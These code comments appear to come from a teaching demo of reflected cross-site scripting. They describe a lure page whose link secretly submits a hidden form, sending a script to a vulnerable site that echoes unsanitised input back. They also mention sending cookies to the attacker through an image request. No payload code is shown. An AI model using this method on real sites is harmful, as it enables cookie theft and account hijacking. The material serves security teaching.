// The hacker's first site to which an unsuspecting user is attracted. 
// The hacker's site shows a lot of useful information and generally looks
// very good but there is one link which is malicious.
// The link points to a popular site (which is vulnerable).
// The hacker wants to execute his script on the user's browser to steal cookies.
// If there is a page on the popular site which just echoes what the user sends
//(see index.php), then that is what the hacker needs. Again the server script
// does not sanitise inputs.

// In this page, the hyperlink is actually part of a form (which the user is not
// aware of). 
// On clicking the link, the default action (which is to go to the server
// is prevented by the hacker. Instead he sends a script (which he knows the server
// will just echo back) through the form. The script here just alerts the cookies.
// But in reality an image can be used to send all cookies to the hacker's site.
// Remember, making cross domain requests is a cake-walk with images.
